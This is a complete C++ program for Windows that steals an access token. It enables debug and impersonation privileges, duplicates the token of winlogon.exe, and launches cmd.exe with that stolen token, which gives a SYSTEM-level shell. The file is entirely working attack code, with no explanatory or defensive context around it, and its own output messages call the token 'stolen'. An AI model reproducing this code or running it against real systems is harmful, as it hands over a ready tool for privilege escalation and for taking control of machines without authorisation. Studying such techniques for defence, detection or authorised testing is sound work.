#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

bool EnablePrivilege(LPCWSTR priv) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L"[-] OpenProcessToken failed.\n";
        return false;
    }
    if (!LookupPrivilegeValue(NULL, priv, &tp.Privileges[0].Luid)) {
        std::wcout << L"[-] LookupPrivilegeValue failed.\n";
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::wcout << L"[-] AdjustTokenPrivileges failed.\n";
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    return true;
}

DWORD GetProcessIdByName(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, processName)) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}

int main() {
    if (!EnablePrivilege(SE_DEBUG_NAME) || !EnablePrivilege(SE_IMPERSONATE_NAME)) {
        std::wcout << L"[-] Failed to enable required privileges.\n";
        return 1;
    }

    DWORD pid = GetProcessIdByName(L"winlogon.exe");
    if (!pid) {
        std::wcout << L"[-] Target process not found.\n";
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::wcout << L"[-] Failed to open target process.\n";
        return 1;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        std::wcout << L"[-] Failed to open target process token.\n";
        CloseHandle(hProcess);
        return 1;
    }
    CloseHandle(hProcess);

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        std::wcout << L"[-] Failed to duplicate token.\n";
        CloseHandle(hToken);
        return 1;
    }
    CloseHandle(hToken);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        std::wcout << L"[-] Failed to create process with stolen token.\n";
        CloseHandle(hDupToken);
        return 1;
    }

    std::wcout << L"[+] Successfully launched cmd.exe as another user!\n";
    CloseHandle(hDupToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
